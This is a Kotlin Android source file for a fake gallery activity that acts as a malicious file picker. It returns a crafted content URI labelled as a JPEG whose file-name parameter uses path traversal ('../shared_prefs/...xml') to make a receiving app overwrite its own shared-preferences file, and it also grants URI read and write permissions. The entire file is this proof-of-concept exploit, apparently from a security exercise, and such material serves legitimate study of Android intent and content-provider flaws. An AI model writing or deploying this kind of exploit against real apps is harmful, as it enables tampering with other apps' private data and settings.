package com.example.mekato

import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.StrictMode
import android.util.Log

class FakeGalery : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_fake_galery)

        StrictMode.setVmPolicy(StrictMode.VmPolicy.LAX)
        intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_WRITE_URI_PERMISSION
        Log.v("Paila", "-----------------> Paila called <------------")
        setResult(-1, intent.setDataAndType(Uri.parse("content://com.example.mekato/exploit.txt?path=/data/data/com.example.mekato/files/exploit.txt&name=../shared_prefs/suanfonsonPreferences.xml"), "image/jpeg"))

        finish()
        Log.v("Paila", "Finish()")
    }
}